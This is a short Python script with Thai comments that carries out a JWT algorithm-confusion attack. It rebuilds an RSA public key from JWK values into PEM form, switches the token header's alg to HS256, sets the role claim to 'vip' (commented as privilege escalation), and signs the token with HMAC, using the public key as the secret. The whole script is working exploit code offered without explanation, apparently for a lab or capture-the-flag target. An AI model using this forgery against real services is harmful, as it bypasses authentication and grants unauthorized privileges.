from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import base64

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

n_b64 = "vmEKQTtwPlcdX9KgTCtzoKQ3Qek9cWxGMvVopXuZ-_ZAyeYbK2a0v_WN_jtRyRDg-5q38kHJajgYHV2_6RIKeMwGKdWlWmxNn1GzC15WuJjxgb-r8OQbsE9glkdnG_UWOMG_cyyEuwyZZO7LVhVcW63wJUr_hcqKgowvd5WP3VHILdSq8eU18bk8fhCHwnDubajltyTLhoT55ie4JXSHP44dUHEho1fGR8YPujz09lPGJzcqU9tTUjGLsj17JODtHV0JSh7akhXDR7w3UeXAX-a4Zxl4_gJP-tfDLjZNy4_SJByY1944l6A7Rag2CvFIcRAaZ3GIlrg6tO9k572IAw"
e_b64 = "AQAB"

n = int.from_bytes(b64url_decode(n_b64), 'big')
e = int.from_bytes(b64url_decode(e_b64), 'big')

pub_key = RSAPublicNumbers(e, n).public_key(default_backend())
pem = pub_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

import hmac, hashlib, json, time

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

# Header: เปลี่ยน alg เป็น HS256
header = {"alg": "HS256", "kid": "vip-key-1", "typ": "JWT"}

# Payload: เปลี่ยน role เป็น vip
now = int(time.time())
payload = {
    "sub": "test",
    "role": "vip",       # <-- privilege escalation
    "iat": now,
    "exp": now + 86400
}

header_enc  = b64url_encode(json.dumps(header,  separators=(',',':')).encode())
payload_enc = b64url_encode(json.dumps(payload, separators=(',',':')).encode())

signing_input = f"{header_enc}.{payload_enc}".encode()

# ใช้ PEM ของ Public Key เป็น HMAC Secret
sig = hmac.new(pem, signing_input, hashlib.sha256).digest()
sig_enc = b64url_encode(sig)

token = f"{header_enc}.{payload_enc}.{sig_enc}"

print(token)
